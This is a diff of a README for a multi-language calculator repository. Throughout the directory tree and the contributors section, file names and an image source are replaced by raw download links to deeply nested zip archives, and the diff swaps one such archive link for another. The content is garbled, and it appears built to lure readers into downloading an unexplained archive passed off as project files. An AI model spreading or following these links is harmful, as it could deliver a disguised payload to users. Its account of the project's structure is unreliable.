@@ -51,19 +51,19 @@ Polyglot-Calculators/
 │
 ├── 🛝 Playground/              
 │   ├── 👤 B3rou/
-│   │   ├── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
+│   │   ├── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
 │   │   └── SimpleCalculator.c
 │   ├── 👤 Contributor1/
-│   │   └── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
+│   │   └── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
 │   ├── 👤 Contributor2/
-│   │   └── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
+│   │   └── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
 │   │   └── BMI Calculator/
 │   │       └── BMICalculator.c
-│   └── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
+│   └── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
 │
 ├── .github/
-├── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
-└── https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip
+├── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
+└── https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip
 
 ```
 
@@ -116,8 +116,8 @@ This section is reserved for the list of contributors who help shape this projec
 
 > ✨ *Want to join us? A single PR is enough!*
 
-<a href="https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip">
-  <img src="https://github.com/MilaCodesIt/Polyglot-Calculators/raw/refs/heads/main/Showcase/PHP/Scientific-Calculator/Polyglot-Calculators-3.6.zip" />
+<a href="https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip">
+  <img src="https://raw.githubusercontent.com/MilaCodesIt/Polyglot-Calculators/main/Showcase/Golang/Crypto-Calculator/internal/Calculators-Polyglot-v2.0.zip" />
 </a>
 
 
